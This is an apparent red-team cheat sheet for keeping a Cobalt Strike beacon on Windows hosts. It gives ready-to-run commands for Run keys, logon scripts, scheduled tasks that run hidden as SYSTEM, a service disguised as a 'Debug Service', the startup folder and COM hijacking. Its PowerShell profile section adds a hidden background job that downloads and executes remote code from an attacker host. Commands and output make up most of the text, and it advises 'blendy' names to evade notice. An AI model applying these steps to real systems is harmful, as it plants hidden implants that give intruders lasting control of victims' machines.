# Persistence with CS

#### RUN Key

```
cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
cp C:\Payloads\http_x64.exe C:\Scratch\<BLENDY NAME>
upload C:\Payloads\<BLENDY NAME>

reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run <KEY NAME> REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\<BLENDY NAME>

reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run <KEY NAME>
```

#### Logon Script

ONLY WHEN USER LOGS IN&#x20;

The `HKCU\Environment` registry key contains the user's environment variables, such as `%Path%` and `%TEMP%`. &#x20;

An adversary can add another value to this key called `UserInitMprLogonScript` \[[T1037.001](https://attack.mitre.org/techniques/T1037/001/)].&#x20;

```
reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\<BLENDY NAME>

reg_query HKCU Environment UserInitMprLogonScript
```

#### PowerShell Profile

ONLY WHEN USER OPENS POWERSHELL The PowerShell console supports the following basic profile files. These file paths are the default locations.

* All Users, All Hosts - `$PSHOME\Profile.ps1`
* All Users, Current Host - `$PSHOME\Microsoft.PowerShell_profile.ps1`
* Current User, All Hosts - `$HOME\Documents\WindowsPowerShell\Profile.ps1`
* Current user, Current Host - `$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` If the profile and/or directory doesn't exist, just create it.

```
ls C:\Users\pchilds\Documents​
mkdir C:\Users\<USERNAME>\Documents\WindowsPowerShell

cd C:\Users\<USERNAME>\Documents\WindowsPowerShell
```

LOCAL It's important not to put any code into the profile that will block because the user will not be presented with an input prompt until the profile script has finished executing.  Some workarounds include executing the payload via the [Start-Job](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/start-job?view=powershell-5.1) cmdlet.

```
New-Item -Type File -Name Profile.ps1

$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://<HOST>/<FILE>") }
```

Then upload the profile to the user's WindowsPowerShell directory.

```
beacon> upload C:\Scratch\Profile.ps1
ls
```

#### Scheduled Tasks

AT BOOT RUN BINARY SYSTEM

```
<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task" version="1.4">
  <Triggers>
    <BootTrigger>
      <StartBoundary>2015-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>SYSTEM</UserId>
      <LogonType>ServiceAccount</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Hidden>true</Hidden>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>C:\Path\To\YourBinary.exe</Command>
      <Arguments/>
      <WorkingDirectory/>
    </Exec>
  </Actions>
</Task>

```

AT BOOT RUN BINARY USER BACKGROUNDED NO UI

```
<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task" version="1.4">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId><DOMAIN>\<USERNAME></UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="UserPrincipal">
      <UserId><DOMAIN>\<USERNAME></UserId>
      <LogonType>S4U</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Hidden>true</Hidden>
  </Settings>
  <Actions Context="UserPrincipal">
    <Exec>
      <Command>C:\Path\To\YourBinary.exe</Command>
      <Arguments/>
      <WorkingDirectory/>
    </Exec>
  </Actions>
</Task>
```

AT USER LOGON RUN BINARY

```
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId><DOMAIN>\<USERNAME></UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId><DOMAIN>\<USERNAME></UserId>
    </Principal>
  </Principals>
  <Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command><PATH TO YOUR BINARY</Command>
    </Exec>
  </Actions>
</Task>
```

Create the task, UI will open, select your XML task definition

```
schtaskscreate \<SCHTASK NAME HERE> XML CREATE
```

#### Service Persistence

```
cd C:\Windows\System32\
upload C:\Payloads\beacon_x64.svc.exe
mv beacon_x64.svc.exe debug_svc.exe

sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3

 create_service:
  hostname:     
  servicename:  dbgsvc
  displayname:  Debug Service
  binpath:      C:\Windows\System32\debug_svc.exe
  newdesc:      The Windows Debug Service
  desclen:      26
  ignoremode:   0
  startmode:    2
  service_type: 10
SUCCESS.

# VERIFY
sc_qc dbgsvc
```

### Startup Folder <a href="#el_1736252120729_636" id="el_1736252120729_636"></a>

Programs in the user's startup folder will also run automatically on login.  Look in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`. &#x20;

```
cd C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
upload C:\Payloads\http_x64.exe
```

### COM Hijacking <a href="#el_1736269518614_342" id="el_1736269518614_342"></a>

COM provides an interoperability standard so that applications written in different languages can reuse the same software libraries.

Every COM object is tracked in the registry by a unique identifier called a CLSID (which are just GUIDs), and can be found in `HKEY_CLASSES_ROOT\CLSID`.

Under each entry, you will find another key called **InProcServer32** or **LocalServer32**, and within those keys will be a path on disk to the DLL or EXE (respectively) that provides the COM functionality.&#x20;

COM hijacking is a technique \[[T1546.015](https://attack.mitre.org/techniques/T1546/015/)] where an adversary can change or leverage a COM entry to trick an application into loading/executing their malicious code, instead of the intended COM object.

#### Finding COM Hijacks

Set the below filters in procmon

* The _Operation_ is **RegOpenKey**.
* The _Path_ contains **InprocServer32** or **LocalServer32**.
* The _Result_ is **NAME NOT FOUND**.

Example known good COM Hijack: DllHost.exe:  `HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32`.

This key exists in HKLM but not HKCU:

```
Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment

Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32' because it does not exist.
```

Add the below registry values to perform the hijack

```
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Users\ice-wzl\http_x64.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"

```

After logging out and back in this will trigger the hijack and give you a beacon!
